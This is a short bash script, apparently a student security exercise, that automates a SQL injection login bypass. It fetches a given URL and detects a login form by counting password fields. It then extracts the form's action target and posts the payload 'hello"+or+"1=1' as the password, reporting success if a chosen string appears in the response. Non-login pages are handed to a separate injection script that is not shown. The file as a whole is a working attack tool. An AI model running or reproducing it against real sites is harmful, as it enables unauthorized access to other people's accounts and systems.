#! /bin/bash
target=$1
login_key=$2

################# extract the target ##########################
function extract_target(){
	echo "[info] Extracting the target"
	new_target=$(curl -s $target | sed -n 's/.*action="\([^"]*\).*/\1/p')
	old_target=$(echo $target | sed -n 's/.*\/\([^"]*\).*/\1/p')
	final_target=$(echo "$target" | sed -n "s/$old_target/$new_target/p")
	echo "[info] Our final target is : $final_target "
}
################## send login parameters #####################
function try_login(){
	login_result=$(curl -sd myusername=hello\&mypassword=hello\"+or+\"1=1 $final_target)
	echo "$login_result" | grep -i "$login_key"  > /dev/null
	if [ $? == 0 ]
	then 
		echo "[***]  SUCCESS:found the string you are searching , it seems you could login"
	else
		echo "[ya5teeeeh] FAILURE: The string you are searching for wasn't found, it seems you couldn't login "
	fi
}
################## Main Script ###########################
result=$(curl -siL "$target") 2> /dev/null
###### Avoiding bad host names which curl can't resolve ######
curl -siL "$target" > /dev/null
if [ $? == 6 ] 
then
	echo "[Error] Could not resolve host." 
else
	count_password=$(echo "$result" | grep -c type=\"password\" 2>/dev/null)
	if [ $count_password == 1 ]
	then
		echo -e "[info] URL is login page"
		echo -e "[info] Trying to bypass Logging"
		extract_target
		try_login 
	elif [[ "$count_password" == 2 || "$count_password" == 3 ]]
	then
		echo "[info] URL is signup page"
	else 
		echo "[info] URL is not login page"
		. ./normal_injection 
		############## your code.
	fi
fi

#### by Abdelsalam Abbas
### ITI_SA_37
